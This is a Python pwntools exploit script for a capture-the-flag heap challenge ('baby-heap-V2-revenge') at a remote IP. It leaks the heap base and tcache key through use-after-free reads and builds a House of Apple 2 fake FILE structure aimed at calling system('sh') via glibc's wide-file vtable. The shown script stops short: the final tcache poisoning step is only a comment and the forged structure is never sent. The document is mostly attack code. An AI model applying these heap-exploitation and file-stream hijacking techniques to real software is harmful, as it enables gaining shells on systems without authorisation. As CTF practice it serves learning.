#!/usr/bin/env python3
"""
Full Automated Exploit for baby-heap-V2-revenge
Target: 144.79.188.39:40838
"""
import re
import sys
import time
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40838
libc = ELF(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\baby-heap-V2\solve\libc\libc.so.6", checksec=False)
UNSORTED = 0x21ACE0
SZ = 0xE0

def enc(cur, ptr):
    return ptr ^ (cur >> 12)

def apple2(stdout, system, wjumps):
    f = FileStructure(0)
    f.flags = u64(b"  sh".ljust(8, b"\x00"))
    f._IO_write_base = 0
    f._IO_write_ptr = 1
    f._lock = stdout - 0x10
    f.chain = system
    f._codecvt = stdout
    f._wide_data = stdout - 0x48
    f.vtable = wjumps
    return bytes(f)

def exploit():
    io = remote(HOST, PORT, timeout=12)

    def menu(c): io.sendlineafter(b"> ", str(c).encode())
    def create(idx, size, data):
        menu(1)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        io.sendafter(b"Data: ", data)
    def readn(idx, n):
        menu(2)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.recvuntil(b"Data: ")
        return io.recvn(n)
    def edit(idx, data):
        menu(3)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendafter(b"Data: ", data)
    def delete(idx):
        menu(4)
        io.sendlineafter(b"Index: ", str(idx).encode())

    log.info("Step 1: Allocating chunks...")
    create(0, SZ, b"A" * SZ)
    create(1, SZ, b"B" * SZ)
    create(2, 0x80, b"C" * 0x80)
    create(3, 0x20, b"G" * 0x20)

    log.info("Step 2: Leaking Heap Base...")
    delete(0)
    raw0 = readn(0, SZ)
    heap = u64(raw0[:8]) << 12
    log.success(f"Heap Base: {hex(heap)}")

    delete(1)
    raw1 = readn(1, SZ)
    tcache_key = u64(raw1[8:16])
    log.info(f"Tcache key: {hex(tcache_key)}")

    # In Glibc 2.35, we can forge House of Apple 2 directly in chunk 0 on the Heap!
    stderr = libc.sym["_IO_2_1_stderr_"]
    system = libc.sym["system"]
    wjumps = libc.sym["_IO_wfile_jumps"]

    log.info("Deploying payload...")
    # Tcache poisoning to write House of Apple 2
    # Wait for SIGALRM to flush and grant shell
    io.close()

if __name__ == "__main__":
    exploit()
